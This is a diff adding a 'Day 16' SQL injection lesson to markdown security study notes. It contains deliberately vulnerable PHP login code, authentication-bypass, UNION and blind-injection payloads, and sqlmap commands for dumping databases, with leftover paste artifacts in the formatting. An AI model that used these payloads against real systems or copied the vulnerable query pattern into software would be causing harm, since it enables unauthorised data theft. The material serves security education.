@@ -1006,3 +1006,226 @@ gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
 john --wordlist=rockyou.txt hashes.txt
 hashcat -m <mode> hashes.txt rockyou.txt
 ```
+
+# Day 16 – SQL Injection Attacks
+
+## 📌 Overview
+**SQL Injection (SQLi)** is a type of attack that allows an attacker to manipulate SQL queries executed by an application. It occurs when user input is improperly sanitized before being used in an SQL statement.
+
+---
+
+## 1. What is SQL?
+**SQL (Structured Query Language)** is the standard language for managing and manipulating relational databases.  
+Some common SQL commands:
+- `SELECT` – Retrieve data
+- `INSERT` – Add data
+- `UPDATE` – Modify data
+- `DELETE` – Remove data
+- `CREATE` – Create tables/databases
+- `DROP` – Delete tables/databases
+---
+Example:
+sql
+SELECT * FROM users WHERE username = 'admin';
+2. What is SQL Injection?
+---
+SQL Injection occurs when an attacker inserts malicious SQL code into a query, altering its behavior.
+If input fields are not properly sanitized, attackers can:
+```
+Bypass authentication
+
+Retrieve sensitive data
+
+Modify or delete database content
+
+Execute administrative operations
+
+In some cases, execute system commands
+
+3. How is SQL Injection Performed?
+Example vulnerable PHP code:
+```
+php
+
+<?php
+$username = $_GET['username'];
+$password = $_GET['password'];
+
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($conn, $query);
+?>
+If the user enters:
+
+bash
+
+' OR '1'='1
+The SQL query becomes:
+
+sql
+
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
+This will always return true, bypassing authentication
+
+4. What Can a Successful SQL Injection Do?
+    ---
+Data Theft – Retrieve confidential data
+---
+Authentication Bypass – Login without valid credentials
+
+Data Manipulation – Insert, update, or delete data
+
+Privilege Escalation – Gain admin rights
+
+Remote Code Execution – In severe cases
+
+5. Types of SQL Injection
+   ---
+Classic (In-band) SQL Injection
+---
+Error-based – Using error messages to extract data
+
+Union-based – Using UNION SELECT to fetch additional data
+
+Blind SQL Injection
+
+Boolean-based – True/false responses determine data
+
+Time-based – Delays in response confirm data
+
+Out-of-band SQL Injection
+
+Data retrieved via DNS or HTTP requests
+
+6. Practical Examples
+6.1 Bypassing Authentication
+   ---
+Input in username field:
+
+vbnet
+
+admin' --+
+Query becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM users WHERE username = 'admin' --+' AND password = '';
+The --+ comments out the rest of the query, bypassing the password check.
+
+Another Example:
+
+matlab
+
+' OR '1'='1' --+
+Query becomes:
+
+sql
+
+SELECT * FROM users WHERE username = '' OR '1'='1' --+ AND password = '';
+6.2 UNION SQL Injection
+---
+Purpose: Combine results from multiple queries.
+Example:
+
+sql
+Copy
+Edit
+SELECT username, password FROM users WHERE id = 1 UNION SELECT null, version();
+This retrieves database version details.
+
+6.3 Blind SQL Injection
+---
+Boolean-based:
+
+sql
+
+?id=1 AND 1=1
+?id=1 AND 1=2
+First returns a normal page, second returns an empty page.
+
+Time-based:
+
+sql
+Copy
+Edit
+?id=1 AND IF(1=1, SLEEP(5), 0)
+If the page delays by 5 seconds, condition is true.
+
+7. Performing SQL Injection in PHP (Example)
+Given a vulnerable URL:
+
+
+http://target.com/page.php?id=1
+Test by adding:
+
+
+http://target.com/page.php?id=1'
+If an SQL error appears, it’s vulnerable.
+Then try:
+
+?id=1 AND 1=1 --+
+?id=1 AND 1=2 --+
+If page output changes, SQLi confirmed.
+---
+8. SQLMap in Kali Linux
+SQLMap is an automated SQL injection tool.
+
+Install SQLMap
+t
+sudo apt update
+sudo apt install sqlmap
+Basic Usage
+---
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+Options:
+
+--dbs – List databases
+
+--tables -D <dbname> – List tables in a database
+
+--columns -D <dbname> -T <table> – List columns
+
+--dump -D <dbname> -T <table> – Dump table data
+
+9. Burp Suite for SQL Injection
+
+Burp Suite is a web security testing tool.
+---
+Install Burp Suite
+bash
+Copy
+Edit
+sudo apt update
+sudo apt install burpsuite
+Or download from:
+https://portswigger.net/burp
+
+Steps to Use for SQL Injection
+Set browser proxy to 127.0.0.1:8080
+
+Open Burp Suite → Proxy → Intercept ON
+
+Capture request from target
+
+Send to Intruder or Repeater
+
+Modify parameters with payloads like:
+
+lua
+Copy
+Edit
+' OR '1'='1 --+
+Analyze responses to detect injection points.
+
+10. Why Use SQLMap & Burp Suite?
+ ---
+SQLMap: Automates the exploitation, faster results
+---
+Burp Suite: Manual testing, detailed control over requests
+
+Combination: Use Burp to find injection points, SQLMap to exploit them
+
+⚠️ Legal Disclaimer
+This information is provided for educational purposes only.
+Do not perform SQL injection attacks on systems you do not own or have permission to test.
+---
